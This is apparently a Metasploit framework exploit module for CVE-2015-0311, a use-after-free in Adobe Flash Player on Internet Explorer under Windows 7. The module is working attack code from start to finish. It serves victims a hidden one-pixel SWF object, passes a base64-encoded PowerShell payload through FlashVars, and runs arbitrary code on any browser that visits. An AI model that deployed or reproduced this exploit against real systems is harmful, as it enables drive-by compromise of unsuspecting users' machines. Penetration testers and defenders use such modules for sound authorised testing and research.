##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'                => 'Adobe Flash Player ByteArray UncompressViaZlibVariant Use After Free',
      'Description'         => %q{
        This module exploits an use after free vulnerability in Adobe Flash Player. The
        vulnerability occurs in the ByteArray::UncompressViaZlibVariant method, when trying
        to uncompress() a malformed byte stream. This module has been tested successfully
        on Windows 7 SP1 (32 bits), IE 8 to IE 11 and Flash 16.0.0.287, 16.0.0.257 and
        16.0.0.235.
      },
      'License'             => MSF_LICENSE,
      'Author'              =>
        [
          'Unknown', # Vulnerability discovery and exploit in the wild
          'hdarwin', # Public exploit by @hdarwin89
          'juan vazquez' # msf module
        ],
      'References'          =>
        [
          ['CVE', '2015-0311'],
          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsa15-01.html'],
          ['URL', 'http://blog.hacklab.kr/flash-cve-2015-0311-%EB%B6%84%EC%84%9D/'],
          ['URL', 'http://blog.coresecurity.com/2015/03/04/exploiting-cve-2015-0311-a-use-after-free-in-adobe-flash-player/']
        ],
      'Payload'             =>
        {
          'DisableNops' => true
        },
      'Platform'            => 'win',
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :os_name => OperatingSystems::Match::WINDOWS_7,
          :ua_name => Msf::HttpClients::IE,
          :flash   => lambda { |ver| ver =~ /^16\./ && ver <= '16.0.0.287' },
          :arch    => ARCH_X86
        },
      'Targets'             =>
        [
          [ 'Automatic', {} ]
        ],
      'Privileged'          => false,
      'DisclosureDate'      => 'Apr 28 2014',
      'DefaultTarget'       => 0))
  end

  def exploit
    @swf = create_swf
    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri =~ /\.swf$/
      print_status('Sending SWF...')
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})
      return
    end

    print_status('Sending HTML...')
    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    psh_payload = cmd_psh_payload(target_payload, 'x86', {remove_comspec: true})
    b64_payload = Rex::Text.encode_base64(psh_payload)

    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>" Play="true"/>
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0311', 'msf.swf')
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }

    swf
  end

end
